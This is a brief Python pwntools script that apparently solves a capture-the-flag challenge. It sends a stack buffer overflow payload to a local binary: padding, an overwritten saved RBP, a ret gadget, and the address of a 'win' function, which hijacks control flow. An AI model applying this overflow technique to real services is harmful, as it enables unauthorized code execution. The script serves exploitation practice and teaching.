from pwn import *

exe = ELF("./chall")

p = remote("localhost", 5003)
# p = process("./chall")

pl = b'a' * 8
pl += p64(0) # overwriting saved RBP
pl += p64(0x0000000000401238) # overwrited saved RIP with ret instr
pl += p64(exe.sym['win']) # overwrite witha address of win function

p.sendlineafter(b"Enter input: ", pl)
p.interactive()